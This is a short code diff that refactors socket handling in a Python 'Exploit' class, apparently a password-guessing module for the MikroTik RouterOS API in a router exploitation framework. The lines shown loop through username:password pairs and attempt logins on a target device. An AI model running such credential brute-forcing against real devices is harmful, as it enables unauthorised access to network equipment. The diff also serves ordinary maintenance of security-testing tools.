@@ -47,10 +47,11 @@ class Exploit(TCPClient):
     def target_function(self, running, creds):
         while running.is_set():
             try:
-                username, password = creds.next().split(":")
+                username, password = creds.next().split(":", 1)
 
-                tcp_client = self.tcp_connect()
-                apiros = ApiRosClient(tcp_client)
+                tcp_client = self.tcp_create()
+                tcp_sock = tcp_client.connect()
+                apiros = ApiRosClient(tcp_sock)
 
                 output = apiros.login(username, password)
 
@@ -69,9 +70,9 @@ class Exploit(TCPClient):
                 break
 
     def check(self):
-        tcp_client = self.tcp_connect()
-        if tcp_client:
-            self.tcp_close(tcp_client)
+        tcp_client = self.tcp_create()
+        if tcp_client.connect():
+            tcp_client.close()
             return True
 
         return False
